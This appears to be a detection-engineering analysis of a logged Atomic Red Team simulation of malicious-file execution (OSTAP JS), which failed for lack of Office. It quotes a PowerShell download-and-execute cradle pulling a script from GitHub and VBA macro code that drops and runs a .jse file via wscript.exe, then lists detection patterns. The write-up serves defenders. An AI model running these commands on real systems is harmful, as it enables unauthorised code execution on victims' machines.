# T1204.002-4: Malicious File — OSTAP JS version

## Technique Context

T1204.002 (Malicious File) represents user execution of malicious files, typically through social engineering or phishing campaigns. This technique is fundamental to many attack chains as it represents the initial user interaction that enables code execution. The "OSTAP JS version" variant specifically targets JavaScript execution through Windows Script Host (wscript.exe), simulating a common malware delivery mechanism where users are tricked into executing malicious JavaScript files.

Detection engineers focus on monitoring for suspicious script execution patterns, particularly wscript.exe/cscript.exe launching with unusual command lines, file creation in public directories, and the characteristic behavior patterns of JavaScript-based malware loaders like OSTAP, which often create temporary files and spawn additional processes.

## What This Dataset Contains

This dataset captures a failed attempt to execute the OSTAP JS simulation. The Security channel shows the primary PowerShell execution with Security 4688 containing the full command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)`. The script attempts to download and execute the Invoke-MalDoc PowerShell function to create a malicious Word document.

Sysmon captures the process chain clearly: the parent PowerShell (PID 34488) spawns a child PowerShell (PID 36112) with the malicious command line, and a whoami.exe process (PID 28776) for reconnaissance. Sysmon Event 22 shows the DNS query for "raw.githubusercontent.com" indicating the download attempt.

The PowerShell logs reveal the technique's failure due to missing Microsoft Office components. PowerShell Event 4100 shows the critical error: `"Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered"` when attempting to instantiate "Word.Application". The script then encounters cascading registry errors when trying to set Office VBA security settings.

The macro code intended for execution is preserved in the PowerShell logs: `"Open \"C:\Users\Public\art.jse\" For Output As #1\n Write #1, \"WScript.Quit\"\n Close #1\n a = Shell(\"cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse\", vbNormalFocus)"`, which would create a JavaScript file and execute it via wscript.exe.

## What This Dataset Does Not Contain

The dataset lacks the actual malicious file execution that defines T1204.002 because the technique failed at the Office COM object instantiation stage. There's no evidence of:
- The intended Word document creation
- VBA macro execution
- JavaScript file creation at `C:\Users\Public\art.jse`
- wscript.exe execution with the JavaScript payload
- Any subsequent malicious behavior the JavaScript would have performed

The absence of Office applications on this system prevented the technique from reaching the critical user interaction phase where the victim would typically enable macros, which is the core element of T1204.002. The Sysmon configuration's include-mode filtering also means we're missing some intermediate process creation events that might occur in a complete execution.

## Assessment

This dataset provides moderate utility for detection engineering, primarily as a negative case study. It excellently demonstrates the preparatory phases of T1204.002 attacks - the PowerShell-based delivery mechanism, network-based payload retrieval, and attempted Office automation. The comprehensive PowerShell script block logging captures the complete attack logic, including the intended file paths and execution methods.

However, the dataset's value is limited by the technique's failure to complete. Detection engineers cannot observe the critical user interaction elements, the actual malicious file behavior, or the script host execution patterns that are central to defending against this technique. The data is most valuable for detecting the setup phases of similar attacks rather than the execution phases.

The clean process telemetry and network indicators provide good examples of the delivery infrastructure commonly used in real-world campaigns.

## Detection Opportunities Present in This Data

1. **PowerShell download cradle detection** - Monitor for PowerShell command lines containing `IEX (iwr` or `Invoke-Expression (Invoke-WebRequest)` patterns downloading from public repositories
2. **Suspicious GitHub raw content access** - Alert on network connections to `raw.githubusercontent.com` from PowerShell processes, especially when followed by script execution
3. **Office COM automation from PowerShell** - Detect PowerShell attempts to instantiate Office COM objects (`Word.Application`, `Excel.Application`) outside normal user sessions
4. **VBA security registry manipulation** - Monitor registry writes to `HKCU:\Software\Microsoft\Office\*\Security\AccessVBOM` indicating attempts to enable VBA execution
5. **Malicious macro code patterns** - Hunt for PowerShell script blocks containing VBA code that creates files in public directories and executes scripts via `Shell()` functions
6. **Temporary script file creation** - Monitor file creation in `C:\Users\Public\` directory with script extensions (`.jse`, `.js`, `.vbs`) followed by script host execution
7. **Process ancestry anomalies** - Detect PowerShell spawning child PowerShell processes with encoded or obfuscated command lines
8. **Failed COM instantiation clustering** - Track repeated COM object instantiation failures as potential indicators of malware executing on systems without required applications
